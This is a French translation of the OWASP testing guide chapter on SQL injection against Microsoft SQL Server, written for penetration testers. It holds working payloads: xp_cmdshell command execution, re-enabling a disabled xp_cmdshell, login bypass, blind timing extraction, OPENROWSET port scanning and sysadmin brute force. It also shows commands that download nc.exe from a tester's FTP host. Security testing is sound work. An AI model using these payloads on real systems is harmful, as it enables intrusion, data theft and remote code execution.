# Test pour SQL Server

## Sommaire

Dans cette section, certaines techniques d'[injection SQL](https://owasp.org/www-community/attacks/SQL_Injection) qui utilisent des fonctionnalités spécifiques de Microsoft SQL Server seront abordées.

Les vulnérabilités d'injection SQL se produisent chaque fois qu'une entrée est utilisée dans la construction d'une requête SQL sans être correctement contrainte ou filtrée. L'utilisation du SQL dynamique (la construction de requêtes SQL par concaténation de chaînes) ouvre la porte à ces vulnérabilités. L'injection SQL permet à un attaquant d'accéder aux serveurs SQL et d'exécuter du code SQL sous les privilèges de l'utilisateur utilisé pour se connecter à la base de données.

Comme expliqué dans [Injection SQL](https://owasp.org/www-community/attacks/SQL_Injection), un exploit d'injection SQL nécessite deux choses : un point d'entrée et un exploit pour entrer. Tout paramètre contrôlé par l'utilisateur qui est traité par l'application peut cacher une vulnérabilité. Ceci comprend:

- Paramètres d'application dans les chaînes de requête (par exemple, requêtes GET)
- Paramètres d'application inclus dans le corps d'une requête POST
- Informations relatives au navigateur (par exemple, agent utilisateur, référent)
- Informations relatives à l'hôte (par exemple, nom d'hôte, IP)
- Informations relatives à la session (par exemple, ID utilisateur, cookies)

Le serveur Microsoft SQL a quelques caractéristiques uniques, donc certains exploits doivent être spécialement personnalisés pour cette application.

## Comment tester

### Caractéristiques du serveur SQL

Pour commencer, voyons quelques opérateurs et commandes/procédures stockées SQL Server utiles dans un test d'injection SQL :

- opérateur de commentaire : `--` (utile pour forcer la requête à ignorer la partie restante de la requête d'origine ; cela ne sera pas nécessaire dans tous les cas)
- séparateur de requête : `;` (point-virgule)
- Les procédures stockées utiles incluent :
    - [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) exécute n'importe quel shell de commande sur le serveur avec les mêmes autorisations qu'il est en cours d'exécution. Par défaut, seul `sysadmin` est autorisé à l'utiliser et dans SQL Server 2005, il est désactivé par défaut (il peut être réactivé à l'aide de sp_configure)
    - `xp_regread` lit une valeur arbitraire du registre (procédure étendue non documentée)
    - `xp_regwrite` écrit une valeur arbitraire dans le registre (procédure étendue non documentée)
    - [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) Génère un shell de commande Windows et transmet une chaîne pour exécution. Toute sortie est renvoyée sous forme de lignes de texte. Il nécessite les privilèges `sysadmin`.
    - [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) Envoie un message électronique, qui peut inclure une pièce jointe d'ensemble de résultats de requête, aux destinataires spécifiés. Cette procédure stockée étendue utilise SQL Mail pour envoyer le message.

Voyons maintenant quelques exemples d'attaques spécifiques à SQL Server qui utilisent les fonctions susmentionnées. La plupart de ces exemples utiliseront la fonction `exec`.

Ci-dessous, nous montrons comment exécuter une commande shell qui écrit la sortie de la commande `dir c:\inetpub` dans un fichier navigable, en supposant que le serveur Web et le serveur de base de données résident sur le même hôte. La syntaxe suivante utilise `xp_cmdshell` :

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

Alternativement, nous pouvons utiliser `sp_makewebtask` :

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

Une exécution réussie créera un fichier qui pourra être parcouru par le testeur de stylo. Gardez à l'esprit que `sp_makewebtask` est obsolète et, même s'il fonctionne dans toutes les versions de SQL Server jusqu'à 2005, il pourrait être supprimé à l'avenir.

De plus, les fonctions intégrées et les variables d'environnement de SQL Server sont très pratiques. Ce qui suit utilise la fonction `db_name()` pour déclencher une erreur qui renverra le nom de la base de données :

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

Notez l'utilisation de [convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017) :

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` tentera de convertir le résultat de `db_name` (une chaîne) en une variable entière, déclenchant une erreur qui, si elle est affichée par l'application vulnérable, contiendra le nom de la BD.

L'exemple suivant utilise la variable d'environnement `@@version`, combinée à une injection de style `union select`, afin de trouver la version de SQL Server.

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

Et voici la même attaque, mais en utilisant à nouveau l'astuce de conversion :

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

La collecte d'informations est utile pour exploiter les vulnérabilités logicielles au niveau du serveur SQL, via l'exploitation d'une attaque par injection SQL ou un accès direct à l'écouteur SQL.

Dans ce qui suit, nous montrons plusieurs exemples qui exploitent les vulnérabilités d'injection SQL via différents points d'entrée.

### Exemple 1 : Test d'injection SQL dans une requête GET

Le cas le plus simple (et parfois le plus gratifiant) serait celui d'une page de connexion demandant un nom d'utilisateur et un mot de passe pour la connexion de l'utilisateur. Vous pouvez essayer d'entrer la chaîne suivante "' ou '1'='1" (sans les guillemets doubles) :

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

Si l'application utilise des requêtes Dynamic SQL et que la chaîne est ajoutée à la requête de validation des informations d'identification de l'utilisateur, cela peut entraîner une connexion réussie à l'application.

### Exemple 2 : Test d'injection SQL dans une requête GET

Pour savoir combien de colonnes existent

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### Exemple 3 : test dans une requête POST

Injection SQL, contenu HTTP POST : `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

Un exemple de publication complet (`https://vulnerable.web.app/forgotpass.asp`):

```txt
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: http://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

Le message d'erreur obtenu lorsqu'un caractère `'` (guillemet simple) est entré dans le champ email est :

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

### Exemple 4 : Encore un autre exemple GET (utile)

Obtenir le code source de l'application

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### Exemple 5 : `xp_cmdshell` personnalisé

Tous les livres et articles décrivant les meilleures pratiques de sécurité pour SQL Server recommandent de désactiver `xp_cmdshell` dans SQL Server 2000 (dans SQL Server 2005, il est désactivé par défaut). Cependant, si nous avons des droits sysadmin (nativement ou en forçant brutalement le mot de passe sysadmin, voir ci-dessous), nous pouvons souvent contourner cette limitation.

Sur SQL Server 2000 :

- Si `xp_cmdshell` a été désactivé avec `sp_dropextendedproc`, nous pouvons simplement injecter le code suivant :

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

- Si le code précédent ne fonctionne pas, cela signifie que le `xp_log70.dll` a été déplacé ou supprimé. Dans ce cas, nous devons injecter le code suivant :

```sql
CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
    DECLARE @result int, @OLEResult int, @RunResult int
    DECLARE @ShellID int
    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OADestroy @ShellID
    return @result
```

Ce code, écrit par Antonin Foller (voir les liens au bas de la page), crée un nouveau `xp_cmdshell` en utilisant `sp_oacreate`, `sp_oamethod` et `sp_oadestroy` (tant qu'ils n'ont pas été désactivés aussi, bien sûr ). Avant de l'utiliser, nous devons supprimer le premier `xp_cmdshell` que nous avons créé (même s'il ne fonctionnait pas), sinon les deux déclarations entreront en collision.

Sur SQL Server 2005, `xp_cmdshell` peut être activé en injectant le code suivant à la place :

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

### Exemple 6 : Referer / User-Agent

L'en-tête `REFERER` est défini sur :

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`

Permet l'exécution de code SQL arbitraire. La même chose se produit avec l'en-tête User-Agent défini sur :

`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`

### Exemple 7 : SQL Server en tant qu'analyseur de ports

Dans SQL Server, l'une des commandes les plus utiles (au moins pour le testeur d'intrusion) est OPENROWSET, qui est utilisée pour exécuter une requête sur un autre serveur de base de données et récupérer les résultats. Le testeur d'intrusion peut utiliser cette commande pour scanner les ports d'autres machines du réseau cible, en injectant la requête suivante :

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

Cette requête va tenter une connexion à l'adresse x.y.w.z sur le port p. Si le port est fermé, le message suivant sera renvoyé :

`SQL Server does not exist or access denied`

En revanche, si le port est ouvert, l'une des erreurs suivantes sera renvoyée :

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

Bien sûr, le message d'erreur n'est pas toujours disponible. Si c'est le cas, on peut utiliser le temps de réponse pour comprendre ce qui se passe : avec un port fermé, le timeout (5 secondes dans cet exemple) sera consommé, alors qu'un port ouvert renverra le résultat tout de suite.

Gardez à l'esprit que OPENROWSET est activé par défaut dans SQL Server 2000 mais désactivé dans SQL Server 2005.

### Exemple 8 : téléchargement d'exécutables

Une fois que nous pouvons utiliser `xp_cmdshell` (natif ou personnalisé), nous pouvons facilement télécharger des exécutables sur le serveur de base de données cible. Un choix très courant est `netcat.exe`, mais tout cheval de Troie sera utile ici. Si la cible est autorisée à démarrer des connexions FTP vers la machine du testeur, il suffit d'injecter les requêtes suivantes :

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

À ce stade, `nc.exe` sera téléchargé et disponible.

Si FTP n'est pas autorisé par le pare-feu, nous avons une solution de contournement qui exploite le débogueur Windows, `debug.exe`, qui est installé par défaut sur toutes les machines Windows. `Debug.exe` est scriptable et est capable de créer un exécutable en exécutant un fichier de script approprié. Ce que nous devons faire est de convertir l'exécutable en un script de débogage (qui est un fichier 100% ASCII), de le télécharger ligne par ligne et enfin d'appeler `debug.exe` dessus. Il existe plusieurs outils qui créent de tels fichiers de débogage (par exemple : `makescr.exe` par Ollie Whitehouse et `dbgtool.exe` par `toolcrypt.org`). Les requêtes à injecter seront donc les suivantes :

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

À ce stade, notre exécutable est disponible sur la machine cible, prêt à être exécuté. Il existe des outils qui automatisent ce processus, notamment `Bobcat`, qui s'exécute sous Windows, et `Sqlninja`, qui s'exécute sous Unix (voir les outils au bas de cette page).

### Obtenir des informations lorsqu'elles ne sont pas affichées (hors bande)

Tout n'est pas perdu lorsque l'application web ne renvoie aucune information --comme des messages d'erreur descriptifs (cf. [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). Par exemple, il peut arriver que l'on ait accès au code source (par exemple, parce que l'application Web est basée sur un logiciel open source). Ensuite, le testeur de stylo peut exploiter toutes les vulnérabilités d'injection SQL découvertes hors ligne dans l'application Web. Bien qu'un IPS puisse arrêter certaines de ces attaques, la meilleure façon serait de procéder comme suit : développer et tester les attaques dans un banc d'essai créé à cet effet, puis exécuter ces attaques contre l'application Web testée.

D'autres options pour les attaques hors bande sont décrites dans [Exemple 4 ci-dessus](#example-4-yet-another-useful-get-example).

### Attaques par injection SQL aveugle

#### Essai et erreur

Alternativement, on peut jouer chanceux. C'est-à-dire que l'attaquant peut supposer qu'il existe une vulnérabilité d'injection SQL aveugle ou hors bande dans une application Web. Il sélectionnera ensuite un vecteur d'attaque (par exemple, une entrée Web), [utiliser des vecteurs fuzz] (../../6-Appendix/C-Fuzz_Vectors.md) contre ce canal et regardera la réponse. Par exemple, si l'application Web recherche un livre à l'aide d'une requête

```sql
select * from books where title="text entered by the user"
```

alors le testeur d'intrusion peut entrer le texte : `'Bomba' OR 1=1-` et si les données ne sont pas correctement validées, la requête parcourra et renverra la liste complète des livres. C'est la preuve qu'il existe une vulnérabilité d'injection SQL. Le testeur d'intrusion pourrait plus tard "jouer" avec les requêtes afin d'évaluer la criticité de cette vulnérabilité.

#### Si plusieurs messages d'erreur s'affichent

D'un autre côté, si aucune information préalable n'est disponible, il existe toujours une possibilité d'attaquer en exploitant n'importe quel "canal secret". Il peut arriver que des messages d'erreur descriptifs soient arrêtés, alors que les messages d'erreur donnent des informations. Par exemple:

- Dans certains cas, l'application Web (en fait le serveur Web) peut renvoyer le traditionnel "500 : Erreur interne du serveur", par exemple lorsque l'application renvoie une exception qui peut être générée, par exemple, par une requête avec des guillemets non fermés.
- Alors que dans d'autres cas, le serveur renverra un message `200 OK`, mais l'application Web renverra un message d'erreur inséré par les développeurs `Erreur interne du serveur` ou `données erronées`.

Cette seule information peut suffire à comprendre comment la requête SQL dynamique est construite par l'application Web et à régler un exploit. Une autre méthode hors bande consiste à sortir les résultats via des fichiers navigables HTTP.

#### Attaques chronométrées

Il existe une autre possibilité de faire une attaque par injection SQL aveugle lorsqu'il n'y a pas de retour visible de l'application : en mesurant le temps que l'application web met pour répondre à une requête. Une attaque de ce type est [décrite par Anley](http://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf) d'où nous prenons les exemples suivants. Une approche typique utilise la commande `waitfor delay` : disons que l'attaquant veut vérifier si la base de données exemple `pubs` existe, il injectera simplement la commande suivante :

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

En fonction du temps que prend la requête pour revenir, nous connaîtrons la réponse. En fait, nous avons ici deux choses : une "vulnérabilité d'injection SQL" et un "canal secret" qui permet au testeur d'intrusion d'obtenir 1 bit d'information pour chaque requête. Par conséquent, en utilisant plusieurs requêtes (autant de requêtes que de bits dans les informations requises), le testeur de stylo peut obtenir toutes les données qui se trouvent dans la base de données. Regardez la requête suivante

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

En mesurant le temps de réponse et en utilisant différentes valeurs pour `@i`, nous pouvons déduire la longueur du nom de la base de données actuelle, puis commencer à extraire le nom lui-même avec la requête suivante :

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

Cette requête attendra 5 secondes si le bit `@bit` de l'octet `@byte` du nom de la base de données courante est 1, et retournera immédiatement s'il est 0. Imbrication de deux cycles (un pour `@byte` et un pour `@bit`) nous pourrons extraire l'intégralité de l'information.

Cependant, il peut arriver que la commande `waitfor` ne soit pas disponible (par exemple, parce qu'elle est filtrée par un pare-feu d'application IPS/web). Cela ne signifie pas que les attaques par injection SQL aveugle ne peuvent pas être effectuées, car le testeur de stylo ne doit proposer que des opérations chronophages non filtrées. Par exemple

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### Vérification de la version et des vulnérabilités

La même approche temporelle peut également être utilisée pour comprendre à quelle version de SQL Server nous avons affaire. Bien sûr, nous utiliserons la variable intégrée `@@version`. Considérez la requête suivante :

`select @@version`

Sur SQL Server 2005, il renverra quelque chose comme ceci :

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

La partie "2005" de la chaîne s'étend du 22e au 25e caractère. Par conséquent, une requête à injecter peut être la suivante :

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

Une telle requête attendra 5 secondes si le 25ème caractère de la variable `@@version` est `5`, nous montrant que nous avons affaire à un SQL Server 2005. Si la requête revient immédiatement, nous avons probablement affaire à SQL Server 2000, et une autre requête similaire aidera à dissiper tous les doutes.

### Exemple 9 : Bruteforce du mot de passe Sysadmin

Pour forcer brutalement le mot de passe sysadmin, nous pouvons tirer parti du fait que `OPENROWSET` a besoin des informations d'identification appropriées pour effectuer la connexion avec succès et qu'une telle connexion peut également être "bouclée" sur le serveur de base de données local. En combinant ces fonctionnalités avec une attaque par injection d'inférence basée sur le temps de réponse, nous pouvons injecter le code suivant :

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

Ce que nous faisons ici est de tenter une connexion à la base de données locale (spécifiée par le champ vide après `SQLOLEDB`) en utilisant `sa` et `<pwd>` comme informations d'identification. Si le mot de passe est correct et que la connexion est réussie, la requête est exécutée, faisant attendre la BD pendant 5 secondes (et renvoyant également une valeur, puisque OPENROWSET attend au moins une colonne). En récupérant les mots de passe candidats à partir d'une liste de mots et en mesurant le temps nécessaire à chaque connexion, nous pouvons tenter de deviner le mot de passe correct. Dans "Data-mining with SQL Injection and Inference", David Litchfield pousse cette technique encore plus loin, en injectant un morceau de code afin de forcer brutalement le mot de passe sysadmin en utilisant les ressources CPU du serveur DB lui-même.

Une fois que nous avons le mot de passe sysadmin, nous avons deux choix :

- Injectez toutes les requêtes suivantes en utilisant `OPENROWSET`, afin d'utiliser les privilèges sysadmin
- Ajoutez notre utilisateur actuel au groupe sysadmin en utilisant `sp_addsrvrolemember`. Le nom d'utilisateur actuel peut être extrait en utilisant l'injection d'inférence sur la variable "system_user".

N'oubliez pas que OPENROWSET est accessible à tous les utilisateurs sur SQL Server 2000, mais il est limité aux comptes administratifs sur SQL Server 2005.

## Outils

- [Bernardo Damele A. G. : sqlmap, outil d'injection SQL automatique](https://sqlmap.org/)

## Références

### Papiers blanc

- [David Litchfield : "Exploration de données avec injection et inférence SQL"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Chris Anley, "(plus) Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [Conseils techniques Unixwiz.net de Steve Friedl : "Attaques par injection SQL par exemple"](http://www.unixwiz.net/techtips/sql-injection.html)
- [Alexander Chigrik : "Procédures stockées étendues non documentées utiles"](https://www.databasejournal.com/features/mssql/article.php/1441251/Useful-Undocumented-Extended-Stored-Procedures.htm)
- [Antonin Foller : "Custom xp_cmdshell, using shell object"](https://www.motobit.com/tips/detpg_cmdshell)
- [Injection SQL](https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf)
- [Cesar Cerrudo : Manipulation de Microsoft SQL Server à l'aide de l'injection SQL, téléchargement de fichiers, accès au réseau interne, analyse de port, DOS](https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf)
